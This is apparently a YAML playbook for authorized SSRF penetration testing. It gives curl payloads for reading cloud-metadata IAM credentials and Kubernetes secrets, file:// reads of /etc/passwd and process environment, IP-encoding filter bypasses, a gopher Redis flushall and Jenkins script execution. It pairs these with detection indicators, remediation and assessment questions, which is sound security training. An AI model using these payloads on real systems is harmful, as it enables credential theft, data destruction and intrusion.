@@ -1,0 +1,204 @@
+# Category: Web Application Security - SSRF
+name: "Server-Side Request Forgery (SSRF) Testing"
+id: "web-ssrf-001"
+category: "web_application"
+subcategory: "ssrf"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Detect and exploit Server-Side Request Forgery vulnerabilities where user-controlled
+  input causes the server to make HTTP requests to arbitrary destinations. Covers
+  basic SSRF, blind SSRF, cloud metadata exploitation, and filter bypass techniques.
+
+learning_objectives:
+  - Identify parameters that trigger server-side HTTP requests
+  - Exploit SSRF to access cloud metadata services and internal resources
+  - Bypass common SSRF filters using IP encoding and DNS rebinding
+  - Map to OWASP A10:2021 and MITRE ATT&CK T1190
+
+tools:
+  - burp_suite
+  - curl
+  - ssrfmap
+  - interactsh
+  - python3
+  - ncat
+
+prerequisites:
+  - Understanding of HTTP and DNS
+  - Burp Collaborator or interactsh for OOB detection
+  - Written authorization from target owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify parameters that may trigger server-side requests"
+    commands:
+      - "# Look for URL-like parameters in requests"
+      - "curl -s 'http://[target_url]/fetch?url=http://example.com'"
+      - "curl -s 'http://[target_url]/preview?link=http://example.com'"
+      - "curl -s 'http://[target_url]/webhook?callback=http://example.com'"
+      - "# Common parameter names for SSRF"
+      - "# url, link, src, href, path, dest, redirect, callback, webhook, fetch, load, resource, file, page, ref, site, host, target, api"
+      - "# Check request body parameters"
+      - "curl -s -X POST 'http://[target_url]/api/import' -H 'Content-Type: application/json' -d '{\"url\":\"http://example.com\"}'"
+    expected_output: "Parameters that accept URLs and cause server-side fetching"
+    detection: "Outbound HTTP request from server to example.com in proxy/firewall logs"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Basic SSRF — access localhost and internal services"
+    commands:
+      - "# Access localhost"
+      - "curl -s 'http://[target_url]/fetch?url=http://127.0.0.1'"
+      - "curl -s 'http://[target_url]/fetch?url=http://localhost'"
+      - "# Access internal admin panels"
+      - "curl -s 'http://[target_url]/fetch?url=http://127.0.0.1:8080/admin'"
+      - "curl -s 'http://[target_url]/fetch?url=http://127.0.0.1:9000'"
+      - "# Port scan internal network via SSRF"
+      - "for port in 22 80 443 8080 8443 3306 5432 6379 27017; do echo -n \"Port $port: \"; curl -s --max-time 3 \"http://[target_url]/fetch?url=http://127.0.0.1:$port\" | head -c 100; echo; done"
+      - "# Access internal metadata via SSRF"
+      - "curl -s 'http://[target_url]/fetch?url=http://192.168.1.1'"
+    expected_output: "Content from localhost services or error messages revealing internal services"
+    detection: "Outbound connections from web server to internal IPs in firewall/network logs"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Cloud metadata service exploitation via SSRF"
+    commands:
+      - "# AWS EC2 metadata service (IMDSv1)"
+      - "curl -s 'http://[target_url]/fetch?url=http://169.254.169.254/latest/meta-data/'"
+      - "curl -s 'http://[target_url]/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
+      - "curl -s 'http://[target_url]/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[role_name]'"
+      - "curl -s 'http://[target_url]/fetch?url=http://169.254.169.254/latest/user-data'"
+      - "# Azure IMDS"
+      - "curl -s 'http://[target_url]/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true'"
+      - "# GCP metadata service"
+      - "curl -s 'http://[target_url]/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'"
+      - "# Kubernetes API"
+      - "curl -s 'http://[target_url]/fetch?url=http://kubernetes.default.svc/api/v1/namespaces/default/secrets'"
+    expected_output: "AWS IAM credentials, instance metadata, or cloud service tokens"
+    detection: "Requests to 169.254.169.254 from web application process; CloudTrail IMDSv1 usage"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Blind SSRF detection using out-of-band (OOB) techniques"
+    commands:
+      - "# Setup interactsh listener"
+      - "interactsh-client"
+      - "# Or use Burp Collaborator"
+      - "# Test blind SSRF with OOB callback"
+      - "curl -s 'http://[target_url]/fetch?url=http://[interactsh_subdomain].oast.pro'"
+      - "curl -s 'http://[target_url]/webhook?url=http://[interactsh_subdomain].oast.pro'"
+      - "# DNS-based OOB (if HTTP blocked)"
+      - "curl -s 'http://[target_url]/fetch?url=http://[interactsh_subdomain].oast.pro'"
+      - "# Check interactsh for received callbacks"
+      - "# Blind SSRF via file:// protocol"
+      - "curl -s 'http://[target_url]/fetch?url=file:///etc/passwd'"
+      - "curl -s 'http://[target_url]/fetch?url=file:///etc/hosts'"
+      - "curl -s 'http://[target_url]/fetch?url=file:///proc/self/environ'"
+    expected_output: "DNS or HTTP callback received at OOB server; file contents if file:// allowed"
+    detection: "DNS query or HTTP request from target server to interactsh/collaborator domain"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "SSRF filter bypass techniques"
+    commands:
+      - "# Decimal IP encoding"
+      - "curl -s 'http://[target_url]/fetch?url=http://2130706433/' # 127.0.0.1 in decimal"
+      - "# Octal encoding"
+      - "curl -s 'http://[target_url]/fetch?url=http://0177.0.0.1/'"
+      - "# Hex encoding"
+      - "curl -s 'http://[target_url]/fetch?url=http://0x7f000001/'"
+      - "# IPv6 localhost"
+      - "curl -s 'http://[target_url]/fetch?url=http://[::1]/'"
+      - "curl -s 'http://[target_url]/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]/'"
+      - "# URL-encoded characters"
+      - "curl -s 'http://[target_url]/fetch?url=http://127.0.0.1%2580/'"
+      - "# Domain with internal IP in DNS"
+      - "curl -s 'http://[target_url]/fetch?url=http://localtest.me/' # resolves to 127.0.0.1"
+      - "# Open redirect chaining"
+      - "curl -s 'http://[target_url]/fetch?url=http://[trusted_domain]/redirect?to=http://169.254.169.254'"
+    expected_output: "Successful bypass of IP-based SSRF filter via encoding or DNS resolution"
+    detection: "Requests to encoded IPs; DNS resolution of SSRF bypass domains"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "SSRF to RCE via internal services"
+    commands:
+      - "# Redis exploitation via SSRF with Gopher protocol"
+      - "curl -s 'http://[target_url]/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A'"
+      - "# Memcached via Gopher"
+      - "curl -s 'http://[target_url]/fetch?url=gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0atest_value%0d%0a'"
+      - "# Internal Elasticsearch"
+      - "curl -s 'http://[target_url]/fetch?url=http://127.0.0.1:9200/_cat/indices'"
+      - "# Jenkins RCE via SSRF"
+      - "curl -s 'http://[target_url]/fetch?url=http://127.0.0.1:8080/jenkins/scriptText?script=println(\"whoami\".execute().text)'"
+      - "# Internal HTTP API abuse"
+      - "curl -s 'http://[target_url]/fetch?url=http://127.0.0.1:8500/v1/agent/members' # Consul"
+    expected_output: "Data from internal services or code execution via vulnerable internal endpoints"
+    detection: "Gopher protocol usage in application; internal service API calls from web process"
+
+compliance_controls:
+  - standard: "OWASP Top 10 2021"
+    control: "A10:2021"
+    description: "Server-Side Request Forgery (SSRF)"
+  - standard: "OWASP ASVS v4.0"
+    control: "5.2.6"
+    description: "Validate URL scheme, port, and destination against allowlist"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-10"
+    description: "Information input validation"
+  - standard: "PCI DSS v4.0"
+    control: "6.2.4"
+    description: "Prevent common software attacks"
+
+detection:
+  network_indicators:
+    - "Outbound HTTP requests from web server to 169.254.169.254 (cloud metadata)"
+    - "Web server making requests to internal RFC1918 IP addresses"
+    - "Gopher protocol usage in application requests"
+    - "Outbound DNS queries from web server for attacker-controlled domains"
+  log_indicators:
+    - "Web server access logs showing internal IP targets in URL parameters"
+    - "Firewall logs: web server process making unexpected outbound connections"
+    - "AWS CloudTrail: EC2 metadata service requests from unexpected role sessions"
+  endpoint_indicators:
+    - "Cloud metadata credentials used from unexpected external IP"
+    - "Application process making connections to internal management ports"
+
+remediation:
+  immediate:
+    - "Implement strict URL allowlist for all server-side HTTP requests"
+    - "Block requests to 169.254.169.254 at network level"
+    - "Enable IMDSv2 on all EC2 instances (session-oriented, prevents SSRF exploitation)"
+    - "Disable file:// and gopher:// URL schemes in HTTP client configuration"
+  long_term:
+    - "Deploy egress firewall rules blocking web tier from accessing management networks"
+    - "Segment internal services from application tier using network policies"
+    - "Implement DAST scanning including SSRF test cases in CI/CD"
+    - "Deploy cloud-native SSRF protection (AWS IMDSv2, GCP metadata server hop limit)"
+
+variables:
+  target_url: "http://target.example.com"
+  interactsh_subdomain: "abc123.oast.pro"
+  trusted_domain: "trusted.example.com"
+  role_name: "WebAppRole"
+
+assessment_questions:
+  - "What is the difference between basic SSRF and blind SSRF?"
+  - "How does AWS IMDSv2 prevent SSRF exploitation of the metadata service?"
+  - "Why is the Gopher protocol particularly dangerous in SSRF scenarios?"
+  - "What is DNS rebinding and how does it relate to SSRF filter bypass?"
+  - "How would you chain an open redirect to bypass an SSRF allowlist?"
+
+references:
+  - url: "https://portswigger.net/web-security/ssrf"
+    title: "PortSwigger SSRF Labs"
+  - url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+    title: "SSRF Payloads - PayloadsAllTheThings"
+  - url: "https://github.com/tarunkant/Gopherus"
+    title: "Gopherus - SSRF Gopher Payload Generator"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+    title: "OWASP SSRF Prevention Cheat Sheet"
